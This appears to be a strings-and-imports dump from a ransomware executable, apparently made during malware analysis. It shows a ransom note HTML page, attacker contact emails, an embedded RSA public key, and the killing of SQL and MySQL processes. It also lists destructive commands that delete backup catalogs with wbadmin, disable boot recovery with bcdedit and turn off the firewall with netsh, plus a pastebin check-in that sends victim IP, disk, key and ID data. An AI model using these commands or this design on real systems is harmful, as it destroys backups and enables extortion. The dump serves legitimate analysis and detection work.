reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40675a	0x4cbf10	string	0x406690	" not used
0x407310	0x4cbf44	string	0x407240	InputBuffer
0x4073cc	0x4cbf44	string	0x407240	InputBuffer
0x407a70	0x4cbf80	string	0x407a20	InputFileNameWide
0x407a9c	0x4cbf94	string	0x407a20	InputBinaryMode
0x407af0	0x46b5e0	string	0x407a20	;\rdqN
0x407c12	0x4cbfb4	string	0x407bb0	OutputFileNameWide
0x407c31	0x4cbfc8	string	0x407bb0	OutputBinaryMode
0x407c79	0x46b5e0	string	0x407bb0	;\rdqN
0x4080ff	0x4cbffc	string	0x408010	DecodingLookupArray
0x4081a1	0x4cbff0	string	0x408010	Log2Base
0x408201	0x46b5e0	string	0x408010	;\rdqN
0x4084b9	0x4cc084	string	0x408470	/GCM
0x408926	0x4cbfdc	string	0x408920	EncodingParameters
0x408e6a	0x4cc010	string	0x408cc0	InsertLineBreaks
0x408ea1	0x4cc024	string	0x408cc0	MaxLineLength
0x4090ea	0x4cc0b0	string	0x409080	C:\\Windows\
0x409642	0x4cc0e4	string	0x409080	
0x409bca	0x4cc11c	string	0x409080	Unhandled exception caught
0x409d94	0x46b5e0	string	0x409080	;\rdqN
0x40abb7	0x4cc0e4	string	0x40aa20	
0x40b3ba	0x4cc11c	string	0x40aa20	Unhandled exception caught
0x40b58d	0x46b5e0	string	0x40aa20	;\rdqN
0x40b677	0x4b7054	import	0x40b5e0	KERNEL32.dll.FindFirstFileW
0x40b688	0x4cc148	string	0x40b5e0	fuck
0x40ba4e	0x4cc16c	string	0x40b5e0	IDo.txt
0x40ba65	0x4cc17c	string	0x40b5e0	Decryption-Info
0x40bad0	0x4cc0b0	string	0x40b5e0	C:\\Windows\
0x40bc96	0x4b7030	import	0x40b5e0	KERNEL32.dll.lstrcmpW
0x40bcf7	0x4b702c	import	0x40b5e0	KERNEL32.dll.FindNextFileW
0x40bd06	0x4b7018	import	0x40b5e0	KERNEL32.dll.FindClose
0x40c012	0x46b5e0	string	0x40b5e0	;\rdqN
0x40c105	0x4b7054	import	0x40c070	KERNEL32.dll.FindFirstFileW
0x40c118	0x4cc148	string	0x40c070	fuck
0x40c524	0x4cc0b0	string	0x40c070	C:\\Windows\
0x40c6ee	0x4cc1a8	string	0x40c070	threaad
0x40c71c	0x4cc1a8	string	0x40c070	threaad
0x40c75a	0x4b7030	import	0x40c070	KERNEL32.dll.lstrcmpW
0x40c7bb	0x4b702c	import	0x40c070	KERNEL32.dll.FindNextFileW
0x40c7ca	0x4b7018	import	0x40c070	KERNEL32.dll.FindClose
0x40cadd	0x46b5e0	string	0x40c070	;\rdqN
0x40cbc7	0x4b7054	import	0x40cb30	KERNEL32.dll.FindFirstFileW
0x40cbd8	0x4cc148	string	0x40cb30	fuck
0x40cfda	0x4cc0b0	string	0x40cb30	C:\\Windows\
0x40d1a0	0x4b7030	import	0x40cb30	KERNEL32.dll.lstrcmpW
0x40d201	0x4b702c	import	0x40cb30	KERNEL32.dll.FindNextFileW
0x40d210	0x4b7018	import	0x40cb30	KERNEL32.dll.FindClose
0x40d518	0x46b5e0	string	0x40cb30	;\rdqN
0x40d607	0x4b7054	import	0x40d570	KERNEL32.dll.FindFirstFileW
0x40d618	0x4cc148	string	0x40d570	fuck
0x40da1a	0x4cc0b0	string	0x40d570	C:\\Windows\
0x40dbe0	0x4b7030	import	0x40d570	KERNEL32.dll.lstrcmpW
0x40dc41	0x4b702c	import	0x40d570	KERNEL32.dll.FindNextFileW
0x40dc50	0x4b7018	import	0x40d570	KERNEL32.dll.FindClose
0x40df58	0x46b5e0	string	0x40d570	;\rdqN
0x40e049	0x4b7054	import	0x40dfb0	KERNEL32.dll.FindFirstFileW
0x40e05a	0x4cc148	string	0x40dfb0	fuck
0x40e3b2	0x4cc0b0	string	0x40dfb0	C:\\Windows\
0x40e581	0x4b7030	import	0x40dfb0	KERNEL32.dll.lstrcmpW
0x40e5e2	0x4b702c	import	0x40dfb0	KERNEL32.dll.FindNextFileW
0x40e5f1	0x4b7018	import	0x40dfb0	KERNEL32.dll.FindClose
0x40e8f9	0x46b5e0	string	0x40dfb0	;\rdqN
0x40e9e7	0x4b7054	import	0x40e950	KERNEL32.dll.FindFirstFileW
0x40e9f8	0x4cc148	string	0x40e950	fuck
0x40edfa	0x4cc0b0	string	0x40e950	C:\\Windows\
0x40efae	0x4b7030	import	0x40e950	KERNEL32.dll.lstrcmpW
0x40f00f	0x4b702c	import	0x40e950	KERNEL32.dll.FindNextFileW
0x40f01e	0x4b7018	import	0x40e950	KERNEL32.dll.FindClose
0x40f326	0x46b5e0	string	0x40e950	;\rdqN
0x40f417	0x4b7054	import	0x40f380	KERNEL32.dll.FindFirstFileW
0x40f428	0x4cc148	string	0x40f380	fuck
0x40f81d	0x4cc0b0	string	0x40f380	C:\\Windows\
0x40f9d1	0x4b7030	import	0x40f380	KERNEL32.dll.lstrcmpW
0x40fa32	0x4b702c	import	0x40f380	KERNEL32.dll.FindNextFileW
0x40fa41	0x4b7018	import	0x40f380	KERNEL32.dll.FindClose
0x40fd49	0x46b5e0	string	0x40f380	;\rdqN
0x40fded	0x4b705c	import	0x40fda0	KERNEL32.dll.GetLogicalDrives
0x40fed3	0x46b5e0	string	0x40fda0	;\rdqN
0x40ff42	0x4cc1b0	string	0x40fee0	sqlserver.exe
0x40ff8a	0x4cc1c0	string	0x40fee0	msftesql.exe
0x40ffcf	0x4cc1d0	string	0x40fee0	sqlagent.exe
0x410014	0x4cc1e0	string	0x40fee0	sqlbrowser.exe
0x41004d	0x4cc1f0	string	0x40fee0	sqlwriter.exe
0x410083	0x4cc200	string	0x40fee0	mysqld.exe
0x4100b6	0x4cc20c	string	0x40fee0	mysqld-nt.exe
0x4100e9	0x4cc224	string	0x40fee0	mysqld-opt.exe
0x410124	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x41013d	0x4b7020	import	0x40fee0	KERNEL32.dll.CreateToolhelp32Snapshot
0x410157	0x4b7050	import	0x40fee0	KERNEL32.dll.Process32First
0x4101b4	0x4b701c	import	0x40fee0	KERNEL32.dll.OpenProcess
0x4101c3	0x4b7010	import	0x40fee0	KERNEL32.dll.TerminateProcess
0x4101ca	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101da	0x4b7024	import	0x40fee0	KERNEL32.dll.Process32Next
0x4101e5	0x4b7028	import	0x40fee0	KERNEL32.dll.CloseHandle
0x4101f3	0x4b7024	import	0x40fee0	KERNEL32.dll.Process32Next
0x410262	0x46b5e0	string	0x40fee0	;\rdqN
0x410334	0x4b7054	import	0x4102a0	KERNEL32.dll.FindFirstFileW
0x410347	0x4cc148	string	0x4102a0	fuck
0x410515	0x4b7030	import	0x4102a0	KERNEL32.dll.lstrcmpW
0x41053b	0x4cc234	string	0x4102a0	\Decryption-Info.HTA
0x4105e3	0x4cc260	string	0x4102a0	error
0x41066a	0x4b702c	import	0x4102a0	KERNEL32.dll.FindNextFileW
0x410679	0x4b7018	import	0x4102a0	KERNEL32.dll.FindClose
0x410984	0x46b5e0	string	0x4102a0	;\rdqN
0x410a57	0x4b7054	import	0x4109c0	KERNEL32.dll.FindFirstFileW
0x410a68	0x4cc148	string	0x4109c0	fuck
0x410e3b	0x4cc16c	string	0x4109c0	IDo.txt
0x410e4e	0x4cc17c	string	0x4109c0	Decryption-Info
0x410ea6	0x4cc0b0	string	0x4109c0	C:\\Windows\
0x41106c	0x4b7030	import	0x4109c0	KERNEL32.dll.lstrcmpW
0x4110cd	0x4b702c	import	0x4109c0	KERNEL32.dll.FindNextFileW
0x4110dc	0x4b7018	import	0x4109c0	KERNEL32.dll.FindClose
0x4113e4	0x46b5e0	string	0x4109c0	;\rdqN
0x4114d9	0x4b7054	import	0x411440	KERNEL32.dll.FindFirstFileW
0x4114ea	0x4cc148	string	0x411440	fuck
0x411839	0x4cc0b0	string	0x411440	C:\\Windows\
0x411a03	0x4b7030	import	0x411440	KERNEL32.dll.lstrcmpW
0x411a64	0x4b702c	import	0x411440	KERNEL32.dll.FindNextFileW
0x411a73	0x4b7018	import	0x411440	KERNEL32.dll.FindClose
0x411d82	0x46b5e0	string	0x411440	;\rdqN
0x411e2b	0x4cc290	string	0x411dd0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x411efa	0x46b5e0	string	0x411dd0	;\rdqN
0x411f8c	0x4cc2ec	string	0x411f10	active
0x411f9d	0x4cc2f4	string	0x411f10	detive
0x4120ef	0x4cc300	string	0x411f10	pastebin.com
0x412183	0x4cc310	string	0x411f10	/raw/eEpt6UrD
0x412390	0x4cc320	string	0x411f10	/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
0x412438	0x4cc368	string	0x411f10	From
0x41253a	0x4cc390	string	0x411f10	&ip=
0x412552	0x4cc388	string	0x411f10	&disk=
0x412583	0x4cc380	string	0x411f10	&key=
0x4125b4	0x4cc378	string	0x411f10	&id=
0x4125e5	0x4cc370	string	0x411f10	&mail=
0x41302d	0x46b5e0	string	0x411f10	;\rdqN
0x41368c	0x4cc39c	string	0x4135b0	C:\ProgramData\IDo.txt
0x4136fa	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4138c8	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4138fe	0x4cbf70	string	0x4135b0	InputFileName
0x41391d	0x4cbf94	string	0x4135b0	InputBinaryMode
0x413aef	0x4cc488	string	0x4135b0	C:\ProgramData
0x413c61	0x4cc268	string	0x4135b0	0123456789QWERTYUIOPASDFGHJKLZXCVBNM
0x413dfa	0x4cc39c	string	0x4135b0	C:\ProgramData\IDo.txt
0x4142c4	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4142f7	0x4cbfa4	string	0x4135b0	OutputFileName
0x414316	0x4cbfc8	string	0x4135b0	OutputBinaryMode
0x4143e9	0x4cc2ec	string	0x4135b0	active
0x414499	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4144ab	0x4cc498	string	0x4135b0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHpTb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==
0x4144cb	0x4cc46c	string	0x4135b0	C:\ProgramData\pubkey.txt
0x4145f3	0x4cc498	string	0x4135b0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHpTb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==
0x41496e	0x46b5e0	string	0x4135b0	;\rdqN
0x414f38	0x4b7058	import	0x414ef0	KERNEL32.dll.FreeConsole
0x414f8d	0x4cc640	string	0x414ef0	hosdecoder@aol.com
0x414fd7	0x4cc654	string	0x414ef0	hospor@protonmail.com
0x41501c	0x4cc680	string	0x414ef0	.Void
0x4150ac	0x4cc688	string	0x414ef0	net stop SQLWriter
0x4150b6	0x4cc69c	string	0x414ef0	net stop SQLBrowser
0x4150c0	0x4cc6b0	string	0x414ef0	net stop MSSQLSERVER
0x4150ca	0x4cc6c8	string	0x414ef0	net stop MSSQL$CONTOSO1
0x4150d4	0x4cc6e0	string	0x414ef0	net stop MSDTC
0x4150de	0x4cc6f0	string	0x414ef0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x4150e8	0x4cc72c	string	0x414ef0	bcdedit /set {default} recoveryenabled no
0x4150f2	0x4cc758	string	0x414ef0	wbadmin delete catalog -quiet
0x4150fc	0x4cc778	string	0x414ef0	net stop SQLSERVERAGENT
0x415106	0x4cc6b0	string	0x414ef0	net stop MSSQLSERVER
0x415110	0x4cc790	string	0x414ef0	net stop vds
0x41511a	0x4cc7a0	string	0x414ef0	netsh advfirewall set currentprofile state off
0x415124	0x4cc7d0	string	0x414ef0	netsh firewall set opmode mode=disable
0x4151a5	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415382	0x46bf40	string	0x414ef0	WVS3
0x415390	0x46bf40	string	0x414ef0	WVS3
0x4155cd	0x4cc890	string	0x414ef0	<html><head><meta http-equiv='X-UA-Compatible' content='IE=11' /><script type='text/javascript'>window.resizeTo(window.screen.width,window.screen.height);</script><style>body { background-color: #f7f5ff; text-align: center; } #h1{text-shadow: -2px -2px #a2faf6; color: black; transition: font-size 1s; } #h1:hover{ font-size: 50px; } #d1{ background-color: #a9e4e9; width: 93%; height: 190px; margin: auto; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d2{ background-color: #a9e4e9; width: 93%; height: 150px; margin: auto; margin-top: 16px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d1:hover{ box-shadow:-4px -4px 10px black; height: 190px; width: 95%; font-size: 15pt; } #d2:hover{ box-shadow:-4px -4px 10px black; height: 170px; width: 95%; font-size: 15pt; } #d3{ background-color: #a9e4e9; width: 93%; height: 90px; margin: auto; margin-top: 10px; text-align: center; border-radius: 13px; font-size: 14pt; padding-top: 10px; transition: width 1s, height 1s ,font-size 1s; font-weight: bold; } #d3:hover{ box-shadow:-4px -4px 10px black; height: 100px; width: 95%; font-size: 15pt; } </style> <title>ENCRYPTED</title></head><body><img src='https://i.ibb.co/2PXVhhm/1.png' height='90px' width
0x415604	0x4cc864	string	0x414ef0	<br> Our Email :
0x4156cc	0x4cc828	string	0x414ef0	<br> In Case Of No Answer :
0x415797	0x4cc7f8	string	0x414ef0	</div> </body> </html>
0x415a59	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415dc5	0x4cdfc0	string	0x414ef0	threads
0x415e53	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x415f50	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x415fd5	0x4cdfc0	string	0x414ef0	threads
0x41609b	0x4b7014	import	0x414ef0	KERNEL32.dll.GetDriveTypeA
0x41619c	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x41621d	0x4cdfc0	string	0x414ef0	threads
0x4162b5	0x4cc46c	string	0x414ef0	C:\ProgramData\pubkey.txt
0x4162bf	0x4cdfc8	string	0x414ef0	C:\ProgramData\ID0.txt
0x41635c	0x4cc11c	string	0x414ef0	Unhandled exception caught
0x4167d4	0x46b5e0	string	0x414ef0	;\rdqN
0x4170bf	0x4170c9	string	0x417040	3ɉHP blocks=Basic Latin,Latin Extended-B
0x4170ee	0x4170f8	string	0x417040	3ɉHP blocks=Basic Latin,Latin Extended-B
0x417b66	0x417b76	string	0x417af0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417b6c	0x417b76	string	0x417af0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417bbf	0x417bcf	string	0x417af0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417bc5	0x417bcf	string	0x417af0	3ɉJP blocks=Basic Latin,Latin Extended-B
0x417c52	0x4cbf50	string	0x417c20	SHA-1
0x417fc7	0x4cdfe0	string	0x417f90	OutputStringPointer
0x418fe7	0x418ff9	string	0x418f30	3ۋE\b blocks=Basic Latin,Arabic
0x419903	0x419907	string	0x4198e0	WPRQ
0x419a16	0x46b5e0	string	0x419940	;\rdqN
0x419b1f	0x46b5e0	string	0x419a30	;\rdqN
0x419d95	0x48e89d	string	0x419d00	j\fh0JN
0x419fad	0x46b5e0	string	0x419d00	;\rdqN
0x41a0fa	0x46b5e0	string	0x41a0d0	;\rdqN
0x41a138	0x46b5e0	string	0x41a0d0	;\rdqN
0x41a19b	0x46b5e0	string	0x41a0d0	;\rdqN
0x41a22e	0x46b5e0	string	0x41a0d0	;\rdqN
0x41ade6	0x4cc39c	string	0x41acf0	C:\ProgramData\IDo.txt
0x41afd4	0x46b5e0	string	0x41af00	;\rdqN
0x41b0ec	0x46b5e0	string	0x41afe0	;\rdqN
0x41b70a	0x46b5e0	string	0x41b480	;\rdqN
0x41b835	0x46b5e0	string	0x41b810	;\rdqN
0x41b871	0x46b5e0	string	0x41b810	;\rdqN
0x41b8b2	0x48c165	string	0x41b810	j\fh\bIN
0x41b8cc	0x46b5e0	string	0x41b810	;\rdqN
0x41b92b	0x46b5e0	string	0x41b810	;\rdqN
0x41b96e	0x46b5e0	string	0x41b810	;\rdqN
0x41bf1c	0x41bf26	string	0x41bec0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41bf4e	0x41bf58	string	0x41bec0	3ɉHP blocks=Basic Latin,Latin Extended-B
0x41ce93	0x41cea3	string	0x41ce40	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41ce99	0x41cea3	string	0x41ce40	3ɉJP blocks=Basic Latin,Latin Extended-B
0x41d106	0x46b5e0	string	0x41d070	;\rdqN
0x41d35c	0x46b5e0	string	0x41d300	;\rdqN
0x41d51d	0x46b5e0	string	0x41d370	;\rdqN
0x41d6dd	0x46b5e0	string	0x41d530	;\rdqN
0x41d760	0x46b5e0	string	0x41d6f0	;\rdqN
0x41d7e0	0x46b5e0	string	0x41d770	;\rdqN
0x41d85d	0x46b5e0	string	0x41d7f0	;\rdqN
0x41d8dd	0x46b5e0	string	0x41d870	;\rdqN
0x41dbf4	0x46b5e0	string	0x41d8f0	;\rdqN
0x41df51	0x4ce084	string	0x41df10	BufferedTransformation: this object doesn't allow input
0x41e0f1	0x4ce084	string	0x41e0b0	BufferedTransformation: this object doesn't allow input
0x41ea9e	0x46b5e0	string	0x41ea30	;\rdqN
0x41ead6	0x46b5e0	string	0x41ea30	;\rdqN
0x41eae8	0x46b5e0	string	0x41ea30	;\rdqN
0x41f042	0x46b5e0	string	0x41efe0	;\rdqN
0x41f07a	0x46b5e0	string	0x41efe0	;\rdqN
0x41f08c	0x46b5e0	string	0x41efe0	;\rdqN
0x41f186	0x46b5e0	string	0x41f0a0	;\rdqN
0x41f9b0	0x4ce0bc	string	0x41f9b0	vector<T> too long
0x41ffd3	0x46b5e0	string	0x41fb80	;\rdqN
0x420527	0x46b5e0	string	0x420080	;\rdqN
0x42066c	0x4cc08c	string	0x420600	MGF1
0x420692	0x4cbf50	string	0x420600	SHA-1
0x4208c0	0x4ce128	string	0x4208c0	invalid string position
0x420bed	0x46b5e0	string	0x420b30	;\rdqN
0x420ee8	0x420ed8	string	0x420ec0	;P\bu\r
0x421263	0x46b5e0	string	0x421080	;\rdqN
0x42145a	0x46b5e0	string	0x421270	;\rdqN
0x421c0a	0x46b5e0	string	0x421a90	;\rdqN
0x421d14	0x46b5e0	string	0x421c20	;\rdqN
0x421e71	0x46b5e0	string	0x421d40	;\rdqN
0x421fb1	0x46b5e0	string	0x421e80	;\rdqN
0x421ffb	0x4cbf58	string	0x421fc0	FeedbackSize
0x422020	0x46b5e0	string	0x421fc0	;\rdqN
0x422162	0x46b5e0	string	0x422030	;\rdqN
0x422689	0x4cc19c	string	0x422580	shit
0x42284d	0x46b5e0	string	0x4227a0	;\rdqN
0x422922	0x4cc46c	string	0x4228e0	C:\ProgramData\pubkey.txt
0x4229b2	0x4cc488	string	0x422970	C:\ProgramData
0x422cde	0x46b5e0	string	0x422ad0	;\rdqN
0x422f2c	0x46b5e0	string	0x422d30	;\rdqN
0x423adc	0x46b5e0	string	0x423930	;\rdqN
0x423ca9	0x46b5e0	string	0x423af0	;\rdqN
0x423e98	0x46b5e0	string	0x423cc0	;\rdqN
0x4248c4	0x46b5e0	string	0x4246b0	;\rdqN
0x424ce0	0x4ce140	string	0x424ce0	string too long
0x4256b5	0x4cbbf8	string	0x4255c0	false
0x4256cb	0x4cbc00	string	0x4255c0	true
0x425768	0x46b5e0	string	0x4255c0	;\rdqN
0x4259ea	0x46b5e0	string	0x4257a0	;\rdqN
0x425c36	0x46b5e0	string	0x425b00	;\rdqN
0x425d3e	0x46b5e0	string	0x425c50	;\rdqN
0x425e3f	0x46b5e0	string	0x425d50	;\rdqN
0x4262a8	0x46b5e0	string	0x426210	;\rdqN
0x426355	0x46b5e0	string	0x4262c0	;\rdqN
0x426428	0x46b5e0	string	0x426360	;\rdqN
0x426725	0x46b5e0	string	0x426650	;\rdqN
0x426802	0x46b5e0	string	0x426730	;\rdqN
0x426dd6	0x46b5e0	string	0x426c00	;\rdqN
0x426fbc	0x46b5e0	string	0x426de0	;\rdqN
0x427b94	0x4b7278	import	0x427b70	WS2_32.dll.socket
0x427ba5	0x4b7468	string	0x427b70	Failed to create socket
0x427bfb	0x4b727c	import	0x427b70	WS2_32.dll.setsockopt
0x427c06	0x4b7480	string	0x427b70	all your TCP packets will be buffered
0x427c0b	0x4b74a8	string	0x427b70	Failed to set socket option "TCP_NODELAY" ;
0x427c28	0x4b727c	import	0x427b70	WS2_32.dll.setsockopt
0x427c33	0x4b74d8	string	0x427b70	Failed to enable broadcast on UDP socket
0x427dc9	0x4b7270	import	0x427dc0	WS2_32.dll.htonl
0x427e57	0x4b7504	string	0x427e20	www.sfml-dev.org
0x427f1f	0x4b7518	string	0x427e20	/ip-provider.php
0x42823f	0x46b5e0	string	0x427e20	;\rdqN
0x42840d	0x4b752c	string	0x428400	255.255.255.255
0x428427	0x42843b	string	0x428400	h<uK
0x42843b	0x4b753c	string	0x428400	0.0.0.0
0x428458	0x4b726c	import	0x428400	WS2_32.dll.inet_addr
0x42849d	0x4b7260	import	0x428400	WS2_32.dll.getaddrinfo
0x4284b5	0x4b725c	import	0x428400	WS2_32.dll.freeaddrinfo
0x4284d2	0x4b7264	import	0x4284d0	WS2_32.dll.ntohl
0x4284e7	0x4b7268	import	0x4284e0	WS2_32.dll.inet_ntoa
0x428e0f	0x46b5e0	string	0x428aa0	;\rdqN
0x42952e	0x429540	string	0x4294c0	_^[]
0x429f7b	0x429fb0	string	0x429eb0	;K\fs
0x42aca4	0x46b5e0	string	0x42a750	;\rdqN
0x42adcb	0x4cbbf8	string	0x42acd0	false
0x42adf9	0x4cbc00	string	0x42acd0	true
0x42af86	0x4b77bc	string	0x42ae60	0123456789-+Ee
0x42bae5	0x46b5e0	string	0x42ae60	;\rdqN
0x42bbfd	0x4b77e8	string	0x42bb00	0123456789ABCDEFabcdef-+XxPp
0x42c7bf	0x46b5e0	string	0x42bb00	;\rdqN
0x42c856	0x4b77cc	string	0x42c7d0	0123456789ABCDEFabcdef-+Xx
0x42ccc6	0x46b5e0	string	0x42c7d0	;\rdqN
0x42d255	0x46b5e0	string	0x42cd70	;\rdqN
0x42d4d7	0x46b5e0	string	0x42d3a0	;\rdqN
0x42d60b	0x46b5e0	string	0x42d4f0	;\rdqN
0x42d72e	0x46b5e0	string	0x42d620	;\rdqN
0x42d84e	0x46b5e0	string	0x42d740	;\rdqN
0x42d9c8	0x46b5e0	string	0x42d860	;\rdqN
0x42db3f	0x46b5e0	string	0x42d9e0	;\rdqN
0x42dd13	0x46b5e0	string	0x42db50	;\rdqN
0x42de26	0x46b5e0	string	0x42dd20	;\rdqN
0x42df58	0x46b5e0	string	0x42de40	;\rdqN
0x42e088	0x46b5e0	string	0x42df70	;\rdqN
0x42e356	0x46b5e0	string	0x42e0a0	;\rdqN
